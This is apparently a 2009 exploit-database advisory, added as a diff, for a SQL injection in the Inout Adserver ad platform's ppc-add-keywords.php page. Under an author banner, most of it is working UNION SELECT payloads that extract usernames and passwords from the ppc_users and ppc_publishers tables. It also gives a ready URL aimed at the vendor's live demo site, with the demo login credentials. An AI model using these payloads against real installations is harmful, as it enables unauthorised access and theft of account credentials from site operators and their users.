@@ -1,0 +1,60 @@
+# Inout Adserver (id) Remote SQL injection                         [_][-][X]
+      _  ___  _  ___      ___ ___ _____      __  ___ __   __  ___       
+     | |/ / || |/ __|___ / __| _ \ __\ \    / / |_  )  \ /  \/ _ \      
+     | ' <| __ | (_ |___| (__|   / _| \ \/\/ /   / / () | () \_, /      
+     |_|\_\_||_|\___|    \___|_|_\___| \_/\_/   /___\__/ \__/ /_/       
+                                                                          
+                                                                        
+      Red n'black i dress eagle on my chest.
+      It's good to be an ALBANIAN Keep my head up high for that flag i die.
+      Im proud to be an ALBANIAN
+   ########################################################################   
+
+       Author             : boom3rang                              
+       Contact            : boom3rang[at]live.com                         
+       Greetz             : H!tm@N - KHG - cHs
+
+                  R.I.P redc00de                 
+   ------------------------------------------------------------------------
+
+                  Affected software description    	                  
+       Software 	: Inout Adserver            	                          
+       Vendor		: http://www.inoutscripts.com/products/adserver/	           
+       Price 	      	: Just $99.95          
+       Version Vuln.   : /		
+ 
+   ------------------------------------------------------------------------
+
+                 Proof Of Concept!
+               --------------------
+
+= NOTE!! =
+########################################################################################
+First you need to create an Advertiser account to the site, it's free, then you need "login" to execute this exploit!
+########################################################################################
+
+Dork: N/W
+---------------------------------------------------------------------------------------
+SQLi:
+http://localhost/PATH/ppc-add-keywords.php?id= [ Exploit ]
+---------------------------------------------------------------------------------------
+Exploit: 
+   1+union+all+select+concat(username,char(58),password),2,3,null+from+ppc_users--
+
+   1+union+all+select+concat(username,char(58),password),2,3,null+from+ppc_publishers--
+---------------------------------------------------------------------------------------
+
+Example:
+http://localhost/PATH/ppc-add-keywords.php?id=1+union+all+select+concat(username,char(58),password),2,3,null+from+ppc_users--
+
+---------------------------------------------------------------------------------------
+
+LiveDemo:
+
+Advertiser Demo Login!   
+Username : advertiser
+Password : advertiser 
+
+http://www.inoutscripts.com/demo/inout_adserver/ppc-add-keywords.php?id=348+union+all+select+concat(username,char(58),password),2,3,null+from+ppc_users--
+
+# milw0rm.com [2009-07-27]
